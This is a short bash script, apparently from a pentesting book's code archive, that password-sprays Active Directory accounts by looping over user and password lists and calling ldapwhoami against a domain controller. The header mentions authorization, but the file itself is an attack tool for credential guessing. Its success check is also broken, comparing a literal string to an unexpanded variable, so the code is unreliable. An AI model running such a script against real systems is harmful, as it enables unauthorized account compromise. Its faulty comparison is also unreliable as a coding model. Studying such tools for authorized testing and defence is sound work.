#!/bin/bash

#############################################################################
### The code and scripts provided in this archive are not for beginners!  ### 
###                                                                       ###
### Some of the code and scripts will require debugging, modifications    ###
### and adjustments to run in your environment.                           ###
###                                                                       ###
### Refer to the book for details, intent and proper context for provided ###
### examples. Remember that pentesting requires authorization from proper ### 
### stakeholders before engaging                                          ###
#############################################################################

echo "Usage: $0 accounts.list passwords.list" 

#if authentication succeeds, then ldapwhoami result starts with u:
LDAP_WHOAMI_HIT=u:

p=1
while IFS= read -r pwd; do
    echo "Trying password: $pwd"
    c=0
    while read user; do
        echo "Processing " $c $user::$pwd
        RESULT=$(ldapwhoami -x -Z -H ldaps://your.domain.controller -D $user@your.domain -w $pwd 2> /dev/null)
        if [[ RESULT == LDAP_WHOAMI_HIT*]] ;
        then
           echo $RESULT
        fi
        c=$(($c+1))
    done < "$1"
    p=$(($p+1))
done < "$2"




